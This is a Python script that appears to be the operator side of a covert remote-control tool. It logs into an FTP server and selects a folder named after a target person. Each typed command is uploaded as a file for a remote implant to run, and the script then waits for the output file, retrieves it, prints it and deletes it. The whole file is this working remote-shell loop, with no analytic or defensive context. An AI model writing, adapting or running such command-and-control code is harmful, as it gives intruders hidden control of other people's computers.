import os
import sys
import ftplib

from settings import *

from io import BytesIO
from io import StringIO

import readline

username = sys.argv[1]

def main():
    # Basically the same here with the server

    # Sign in
    ftp_handle = ftplib.FTP(ftp_details["host"])
    
    
    # Log in
    ftp_handle.login(user = ftp_details["username"], passwd = ftp_details["password"])

    ftp_handle.cwd(default_control_directory)

    if (username not in ftp_handle.nlst()):
        print("Person does not exist! Typo?")
        exit(True) # Yes, we did return 1!

    ftp_handle.cwd(username)


    readline.parse_and_bind("tab: complete")


    while (True):
        command = input("cmd> ")

        command_encoded = BytesIO(str.encode(command))

        ftp_handle.storbinary("STOR {file}".format(file = execution_filename), command_encoded)

        while (output_filename not in ftp_handle.nlst()):
            pass

        output_buffer = BytesIO()

        ftp_handle.retrbinary("RETR {file}".format(file = output_filename), output_buffer.write)

        print(output_buffer.getvalue().decode())
        
        ftp_handle.delete(output_filename)


if (__name__ == "__main__"):
    main()